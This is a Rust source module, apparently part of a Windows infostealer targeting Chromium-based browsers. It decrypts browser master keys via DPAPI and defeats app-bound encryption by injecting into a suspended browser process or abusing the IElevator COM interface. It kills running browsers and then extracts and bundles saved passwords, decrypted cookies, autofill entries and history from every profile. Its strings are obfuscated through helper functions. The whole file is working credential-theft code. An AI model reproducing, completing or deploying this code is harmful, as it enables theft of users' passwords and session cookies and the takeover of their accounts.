use std::{env, fs, path::{Path, PathBuf}};
use rusqlite::{Connection, OpenFlags};
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use crate::encrypted::*;

#[derive(Clone)]
pub struct MasterKeys {
    pub standard: Vec<u8>,
    pub app_bound: Option<Vec<u8>>,
}

pub fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    crate::core::api::dpapi_decrypt_with_entropy(data, entropy, flags)
}

pub fn extract_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
    let os_crypt = s_os_crypt();
    let app_bound_key = s_app_bound_encrypted_key();
    let key_b64 = json[os_crypt][app_bound_key].as_str()?;
    let mut encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    if encrypted.starts_with(b"APPB") && encrypted.len() > 4 {
        encrypted = encrypted[4..].to_vec();
    }
    Some(encrypted)
}

#[allow(dead_code)]
pub fn extract_raw_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
    let os_crypt = s_os_crypt();
    let app_bound_key = s_app_bound_encrypted_key();
    let key_b64 = json[os_crypt][app_bound_key].as_str()?;
    let encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
    Some(encrypted)
}

use std::{collections::HashMap, sync::Mutex};

static EXTRACTION_CACHE: Mutex<Option<HashMap<String, CachedBrowser>>> = Mutex::new(None);

#[derive(Clone)]
struct CachedBrowser {
    user_data_path: PathBuf,
    has_profiles: bool,
    keys: MasterKeys,
}

fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, keys: &MasterKeys) {
    if let Ok(mut guard) = EXTRACTION_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(
                browser_name.to_string(),
                CachedBrowser {
                    user_data_path: user_data_path.to_path_buf(),
                    has_profiles,
                    keys: MasterKeys {
                        standard: keys.standard.clone(),
                        app_bound: keys.app_bound.clone(),
                    },
                },
            );
        }
    }
}

/// Cache master keys: DPAPI only (legacy), or inject + max 2 fallbacks (app_bound).
pub fn cache_keys_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) {
    if !user_data_path.exists() {
        return;
    }
    if let Some(keys) = get_master_keys(user_data_path, browser_name, true) {
        cache_browser(browser_name, user_data_path, has_profiles, &keys);
    }
}

/// Extract all profile data using keys already cached (post-inject / post-kill).
pub fn extract_all_from_cache() -> Vec<(String, String)> {
    let cache = match EXTRACTION_CACHE.lock() {
        Ok(guard) => guard.clone(),
        Err(_) => return Vec::new(),
    };
    let Some(cache) = cache else { return Vec::new() };

    let mut results = Vec::new();
    for (browser_name, cached) in cache {
        let profiles = get_profiles(&cached.user_data_path, cached.has_profiles);
        for (profile_name, profile_path) in profiles {
            let passwords = extract_passwords(&profile_path, &cached.keys);
            let cookies = extract_cookies(&profile_path, &cached.keys);
            let autofill = extract_autofill(&profile_path);
            let history = extract_history(&profile_path);
            crate::browsers::common::zipp::push_profile_bundle(
                &mut results,
                &browser_name,
                &profile_name,
                passwords,
                cookies,
                autofill,
                history,
            );
        }
    }
    results
}

/// Re-extract cookies/passwords after kill; run inject only here (not during parallel scan).
pub fn extract_post_kill() -> Vec<(String, String)> {
    recover_missing_app_bound_keys();
    extract_all_from_cache()
}

fn recover_missing_app_bound_keys() {
    let Ok(mut guard) = EXTRACTION_CACHE.lock() else { return };
    let Some(map) = guard.as_mut() else { return };

    let pending: Vec<String> = map
        .iter()
        .filter(|(_, c)| c.keys.app_bound.is_none())
        .map(|(name, _)| name.clone())
        .collect();

    for browser_name in pending {
        let Some(cached) = map.get(&browser_name) else { continue };
        let local_state = cached.user_data_path.join(s_local_state());
        let Ok(content) = fs::read_to_string(&local_state) else { continue };
        let Ok(json) = serde_json::from_str::<Value>(&content) else { continue };

        let os_crypt = s_os_crypt();
        let app_bound_key = s_app_bound_encrypted_key();
        if json[&os_crypt][&app_bound_key].as_str().is_none() {
            continue;
        }

        if let Some(k) = fetch_app_bound(&browser_name, &json, true) {
            if let Some(entry) = map.get_mut(&browser_name) {
                entry.keys.app_bound = Some(k);
            }
        }
    }
}

/// Re-extract cookies after all browsers are killed (DB unlocked).
pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
    extract_post_kill()
}

/// App-bound key recovery: 1 primary + max 2 fallbacks.
///   1. inject (suspended browser process)
///   2. elev  (IElevator COM externe)
///   3. dpf   (fallback local)
fn fetch_app_bound(browser_name: &str, json: &Value, allow_inject: bool) -> Option<Vec<u8>> {
    if allow_inject {
        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
            if k.len() == 32 {
                return Some(k);
            }
        }
    }

    if let Some(raw) = extract_app_bound_from_local_state(json) {
        if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
            if k.len() == 32 {
                return Some(k);
            }
        }
    }

    if let Some(k) = crate::browsers::common::dpf::try_from_local_state(json) {
        if k.len() == 32 {
            return Some(k);
        }
    }

    None
}

pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: bool) -> Option<MasterKeys> {
    let local_state = user_data_path.join(s_local_state());
    let content = fs::read_to_string(&local_state).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;

    let os_crypt = s_os_crypt();
    let encrypted_key = s_encrypted_key();
    let enc_key = match json[&os_crypt][&encrypted_key].as_str() {
        Some(k) => k,
        None => return None,
    };
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() <= 5 {
        return None;
    }

    let standard = dpapi_decrypt(&decoded[5..], None, 0)?;

    let app_bound_key = s_app_bound_encrypted_key();
    let has_app_bound = json[&os_crypt][&app_bound_key].as_str().is_some();

    if !has_app_bound {
        // Anciennes versions: clé AES via DPAPI uniquement (v10/v11, pas de v20).
        return Some(MasterKeys { standard, app_bound: None });
    }

    // Nouvelles versions (app_bound / v20): inject + 2 fallbacks max (elev, dpf).
    let app_bound = fetch_app_bound(browser_name, &json, allow_inject);
    Some(MasterKeys { standard, app_bound })
}

fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(iv);
    cipher.decrypt(nonce, ciphertext).ok()
}

fn chacha20_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn aead_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    aes_gcm_decrypt(data, key).or_else(|| chacha20_decrypt(data, key))
}

fn cookie_plaintext(pt: &[u8], is_v20: bool) -> String {
    let data = if is_v20 && pt.len() > 32 { &pt[32..] } else { pt };
    String::from_utf8_lossy(data).into_owned()
}

fn decrypt_cookie_blob(blob: &[u8], keys: &MasterKeys) -> Option<String> {
    if blob.len() < 3 {
        return None;
    }

    let try_decrypt = |key: &[u8]| -> Option<String> {
        aead_decrypt(blob, key).map(|pt| cookie_plaintext(&pt, blob.starts_with(b"v20")))
    };

    if blob.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
    }

    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(blob, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return Some(value);
        }
    }

    None
}

fn decrypt_cookie_value(encrypted: &[u8], plain_value: &str, keys: &MasterKeys) -> String {
    if encrypted.is_empty() {
        return plain_value.to_string();
    }

    for skip in [0usize, 32, 1, 3] {
        if encrypted.len() > skip + 3 {
            if let Some(value) = decrypt_cookie_blob(&encrypted[skip..], keys) {
                if !value.is_empty() {
                    return value;
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return value;
        }
    }

    if !plain_value.is_empty() {
        return plain_value.to_string();
    }

    String::new()
}

fn password_plaintext(pt: &[u8], is_v20: bool) -> Option<String> {
    if is_v20 && pt.len() > 32 {
        if let Ok(s) = String::from_utf8(pt[32..].to_vec()) {
            if !s.is_empty() {
                return Some(s);
            }
        }
    }
    String::from_utf8(pt.to_vec()).ok()
}

fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
    if encrypted.is_empty() { return Some(String::new()); }
    if encrypted.len() > 3 && encrypted.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, true) {
                    return Some(s);
                }
            }
        }
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, true) {
                return Some(s);
            }
        }
        if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
            if let Some(s) = password_plaintext(&dec, true) {
                return Some(s);
            }
        }
        return None;
    }
    if encrypted.len() > 3 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11")) {
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, false) {
                return Some(s);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, false) {
                    return Some(s);
                }
            }
        }
        return None;
    }
    dpapi_decrypt(encrypted, None, 0).and_then(|d| String::from_utf8(d).ok())
}

pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("cr_db_{}.sqlite", nanos));

    let mut last_err = None;
    for attempt in 0..4 {
        match fs::copy(db_path, &temp) {
            Ok(_) => {
                last_err = None;
                break;
            }
            Err(e) => {
                last_err = Some(e);
                if attempt < 3 {
                    std::thread::sleep(std::time::Duration::from_millis(500 * (attempt + 1) as u64));
                }
            }
        }
    }
    if last_err.is_some() {
        return None;
    }

    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in [s_db_wal(), s_db_shm(), s_db_journal()] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }
    Some(temp)
}

pub fn open_db_robust(db_path: &Path) -> Option<(Connection, Option<PathBuf>)> {
    for attempt in 0..3 {
        if let Some(temp) = copy_db(db_path) {
            match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| Connection::open(&temp))) {
                Ok(Ok(c)) => return Some((c, Some(temp))),
                Ok(Err(_)) => {
                    cleanup_db(&temp);
                    if attempt < 2 {
                        std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
                    }
                    continue;
                }
                Err(_) => {
                    cleanup_db(&temp);
                    if attempt < 2 {
                        std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
                    }
                    continue;
                }
            }
        }
        if attempt < 2 {
            std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
        }
    }
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        Connection::open_with_flags(
            db_path,
            OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
        )
    })) {
        Ok(Ok(c)) => Some((c, None)),
        Ok(Err(_)) => None,
        Err(_) => None,
    }
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", &s_db_wal(), &s_db_shm(), &s_db_journal()] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

pub fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let db = profile_path.join(s_login_data());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let query = s_query_logins();
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let password: Vec<u8> = row.get(2)?;
        Ok((url, username, password))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (url, username, password_enc) = row;
        if password_enc.is_empty() && username.is_empty() { continue; }
        let version = if password_enc.starts_with(b"v20") { "v20" }
            else if password_enc.starts_with(b"v10") { "v10" }
            else if password_enc.starts_with(b"v11") { "v11" }
            else { "legacy" };
        let password = decrypt_value(&password_enc, keys)
            .unwrap_or_else(|| format!("[e-{}]", version));
        {
            let fmt = s_cred_fmt();
            let entry = fmt
                .replacen("{}", &url, 1)
                .replacen("{}", &username, 1)
                .replacen("{}", &password, 1)
                .replacen("{}", &"-".repeat(50), 1);
            output.push_str(&entry);
        }
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let network = s_dir_network();
    let cookies = s_file_cookies_db();
    let db_path = if profile_path.join(&network).join(&cookies).exists() {
        profile_path.join(&network).join(&cookies)
    } else {
        profile_path.join(&cookies)
    };
    let (conn, temp) = match open_db_robust(&db_path) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let query = s_query_cookies();
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let rows = match stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_value: Vec<u8> = row.get(2)?;
        let plain_value: String = row.get(3)?;
        let path: String = row.get(4)?;
        let expires: i64 = row.get(5)?;
        let is_secure: i64 = row.get(6)?;
        let is_httponly: i64 = row.get(7)?;
        Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut count = 0;
    let mut body = String::new();
    for row in rows.flatten() {
        let (host, name, enc_value, plain_value, path, expires, is_secure, is_httponly) = row;
        if name.is_empty() {
            continue;
        }
        let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
        let unix_expires = if expires > 0 {
            (expires / 1_000_000) - 11644473600
        } else {
            0
        };
        body.push_str(&crate::browsers::common::nts::format_line(
            &host,
            &path,
            is_secure != 0,
            unix_expires,
            &name,
            &value,
            is_httponly != 0,
        ));
        count += 1;
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if count == 0 {
        None
    } else {
        crate::browsers::common::nts::build_file(&body)
    }
}

pub fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)> {
    let local_state = user_data_path.join(s_local_state());
    let content = match fs::read_to_string(&local_state) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    let info_cache = s_profile_info_cache();
    let sys_prof = s_wpath_system_profile();
    if let Some(cache) = json.pointer(&info_cache).and_then(|v| v.as_object()) {
        for name in cache.keys() {
            if name == &sys_prof {
                continue;
            }
            let path = user_data_path.join(name);
            if path.is_dir() {
                profiles.push((name.clone(), path));
            }
        }
    }

    profiles.sort_by(|a, b| {
        profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0))
    });
    profiles
}

fn profile_sort_key(name: &str) -> (u8, u32, String) {
    let dflt = s_wpath_default();
    let guest = s_wpath_guest_profile();
    let prefix = s_wpath_profile_prefix();
    if name == dflt {
        return (0, 0, String::new());
    }
    if name == guest {
        return (2, 0, String::new());
    }
    if let Some(n) = name.strip_prefix(prefix.as_str()) {
        if let Ok(num) = n.parse::<u32>() {
            return (1, num, String::new());
        }
    }
    (1, u32::MAX, name.to_lowercase())
}

pub fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
    if !has_profiles {
        if user_data_path.exists() {
            return vec![(s_wpath_default(), user_data_path.to_path_buf())];
        }
        return Vec::new();
    }

    let mut profiles = profiles_from_local_state(user_data_path);
    let mut seen: std::collections::HashSet<String> = profiles.iter().map(|(n, _)| n.clone()).collect();

    if let Ok(entries) = fs::read_dir(user_data_path) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            let sys_prof2 = s_wpath_system_profile();
            let dflt2 = s_wpath_default();
            let guest2 = s_wpath_guest_profile();
            let prefix2 = s_wpath_profile_prefix();
            if name == sys_prof2 || name.starts_with('.') {
                continue;
            }
            let is_profile = name == dflt2
                || name == guest2
                || name.starts_with(prefix2.as_str())
                || entry.path().join(s_file_preferences()).exists()
                || entry.path().join(&s_dir_network()).join(&s_file_cookies_db()).exists()
                || entry.path().join(&s_file_cookies_db()).exists();
            if is_profile && seen.insert(name.clone()) {
                profiles.push((name, entry.path()));
            }
        }
    }

    profiles.sort_by(|a, b| profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0)));
    profiles
}

pub fn extract_autofill(profile_path: &Path) -> Option<String> {
    let db = profile_path.join(s_web_data());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let mut stmt = match conn.prepare(&s_query_autofill()) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!("Name: {}\nValue: {}\nCount: {}\n{}\n",
            name, value, count, "-".repeat(50)));
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_history(profile_path: &Path) -> Option<String> {
    let db = profile_path.join(s_history_db());
    let (conn, temp) = match open_db_robust(&db) {
        Some((c, t)) => (c, t),
        None => return None,
    };
    let mut stmt = match conn.prepare(&s_query_history()) {
        Ok(s) => s,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    let mut output = String::new();
    let rows = match stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: i64 = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }) {
        Ok(r) => r,
        Err(_) => { if let Some(t) = &temp { cleanup_db(t); } return None; }
    };
    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!("URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url, title, visit_count, last_visit, "-".repeat(50)));
    }
    drop(stmt); drop(conn); if let Some(t) = &temp { cleanup_db(t); }
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) -> Vec<(String, String)> {
    let mut results = Vec::new();
    if !user_data_path.exists() {
        return results;
    }
    let pids_before = crate::core::kill::snapshot_browser_pids();
    let keys = get_master_keys(user_data_path, browser_name, false);
    if let Some(ref k) = keys {
        cache_browser(browser_name, user_data_path, has_profiles, k);
    }
    crate::core::kill::kill_new_browsers(&pids_before);
    let keys_ref_opt = keys.as_ref();
    let profiles = get_profiles(user_data_path, has_profiles);
    for (profile_name, profile_path) in profiles {
        let passwords = if let Some(keys_ref) = keys_ref_opt {
            extract_passwords(&profile_path, keys_ref)
        } else {
            None
        };
        let dummy_keys = MasterKeys { standard: Vec::new(), app_bound: None };
        let cookies = extract_cookies(&profile_path, keys_ref_opt.unwrap_or(&dummy_keys));
        let autofill = extract_autofill(&profile_path);
        let history = extract_history(&profile_path);

        crate::browsers::common::zipp::push_profile_bundle(
            &mut results,
            browser_name,
            &profile_name,
            passwords,
            cookies,
            autofill,
            history,
        );
    }
    results
}
